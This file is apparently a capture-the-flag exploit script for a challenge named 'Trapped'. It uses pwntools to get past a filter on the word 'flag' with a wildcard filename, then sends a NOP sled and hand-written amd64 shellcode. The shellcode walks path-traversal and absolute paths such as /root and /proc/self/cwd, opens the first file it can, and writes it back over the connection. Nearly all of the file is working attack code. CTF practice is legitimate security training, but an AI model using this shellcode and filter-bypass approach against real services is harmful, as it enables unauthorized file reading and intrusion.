#!/usr/bin/env python3
# exploit_trapped.py
# Exploit for "Trapped" challenge: injects shellcode that tries many flag paths,
# reads the first file that opens, writes it to stdout, then exits.
#
# Usage: python3 exploit_trapped.py HOST PORT

from pwn import *
import sys, time

if len(sys.argv) != 3:
    print("Usage: python3 exploit_trapped.py HOST PORT")
    sys.exit(1)

host = sys.argv[1]
port = int(sys.argv[2])

context.arch = 'amd64'
context.log_level = 'info'

# number of ../ steps (tune if needed)
N = 80
rel_prefix = "../" * N
path_str = rel_prefix + "flag.txt"

# extras: absolute / common fallback locations
extras = [
    "/proc/self/cwd/flag.txt",
    "/proc/self/cwd/../flag.txt",
    "/tmp/flag.txt",
    "/root/flag.txt",
    "/flag",
    "/proc/self/root/flag.txt",
    "/flag.txt"
]

# Build PATH buffer:
# First a long relative path (sliding window), then a block of padded extras (fixed-slot)
slot = 0x100  # padding per extra so assembly can step by constant offset
parts = [path_str.encode()]
parts.append(b"\x00")
for e in extras:
    b = e.encode() + b"\x00"
    if len(b) > slot:
        raise SystemExit("extra path too long, reduce slot or shrink extras")
    b = b + b"\x00" * (slot - len(b))
    parts.append(b)
PATH_BYTES = b"".join(parts)

# assembly: try sliding window over PATH_BYTES by single-byte increments,
# then try the extras by stepping slot bytes.
asm_code = f"""
    /* registers:
       rbx -> candidate pathname
       rcx -> loop counter
    */

    xor rdx, rdx
    xor rsi, rsi
    xor rax, rax
    xor rdi, rdi

    /* first: sliding attempts over PATH_BYTES (len = {len(path_str)} + extras block) */
    lea rbx, [rip + PATH]
    mov rcx, {len(path_str) + 1 + 3}    /* rough upper bound; we'll also add a larger count below */
    /* we'll set rcx to a large value at runtime by mov later */
    /* Instead set rcx to actual len */
    mov rcx, {len(PATH_BYTES)}

loop_try:
    /* syscall: open(rdi=rbx, rax=2) */
    mov rdi, rbx
    mov rax, 2
    syscall
    cmp rax, 0
    js bad_try
    /* success: rax is fd */
    mov rdi, rax
    lea rsi, [rip + BUF]
    mov rdx, 0x400
    xor rax, rax
    syscall            /* read(fd, BUF, 0x400) -> rax = read_len */
    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip + BUF]
    mov rax, 1
    syscall            /* write(1, BUF, read_len) */
    /* exit cleanly */
    mov rax, 60
    xor rdi, rdi
    syscall

bad_try:
    add rbx, 1
    loop loop_try

/* try extras block - chunked by {slot} bytes */
lea rbx, [rip + PATH]
add rbx, {len(path_str) + 1}
mov rcx, {len(extras)}
try_extras:
    mov rdi, rbx
    mov rax, 2
    syscall
    cmp rax, 0
    js next_extra
    mov rdi, rax
    lea rsi, [rip + BUF]
    mov rdx, 0x400
    xor rax, rax
    syscall
    mov rdx, rax
    mov rdi, 1
    lea rsi, [rip + BUF]
    mov rax, 1
    syscall
    mov rax, 60
    xor rdi, rdi
    syscall
next_extra:
    add rbx, {slot}
    loop try_extras

/* nothing found: exit */
mov rax, 60
xor rdi, rdi
syscall

/* data */
PATH:
    .byte {','.join(str(b) for b in PATH_BYTES)}
BUF:
    .space 0x400
"""

# Assemble
shellcode = asm(asm_code)

# Small NOP sled + shellcode
sled = b"\x90" * 32
payload = sled + shellcode

if len(payload) > 0x1000:
    print("[-] payload too large (%d bytes). Reduce N or extras." % len(payload))
    sys.exit(1)

# Connect and exploit
print(f"[*] payload assembled: {len(payload)} bytes")
r = remote(host, port, timeout=8)

# read initial banner (optional)
try:
    banner = r.recv(timeout=2)
    if banner:
        print("=== initial banner ===")
        print(banner.decode(errors='ignore'))
except Exception:
    pass

# Trigger the first prompt: send a filename that does NOT contain 'flag'
# We use a wildcard to avoid the literal 'flag' substring.
r.sendline(b"/fl*.txt")

# Wait for the second prompt (best-effort)
try:
    data = r.recvuntil(b"What would you like me to run next?", timeout=6)
    print("[*] got prompt (or similar).")
    print(data.decode(errors='ignore'))
except Exception:
    print("[!] Did not see exact prompt; proceeding anyway (best-effort).")

# Send the shellcode payload (raw bytes).
print("[*] sending payload...")
r.send(payload)

# Collect output for a short while
out = b""
t_end = time.time() + 6
while time.time() < t_end:
    try:
        chunk = r.recv(timeout=1)
        if not chunk:
            break
        out += chunk
        try:
            print(chunk.decode(errors='ignore'), end="", flush=True)
        except:
            print(repr(chunk))
    except EOFError:
        break
    except Exception:
        pass

if out:
    print("\n=== FINAL OUTPUT ===")
    try:
        print(out.decode(errors='ignore'))
    except:
        print(repr(out))
else:
    print("\n[-] no output received from server")

r.close()
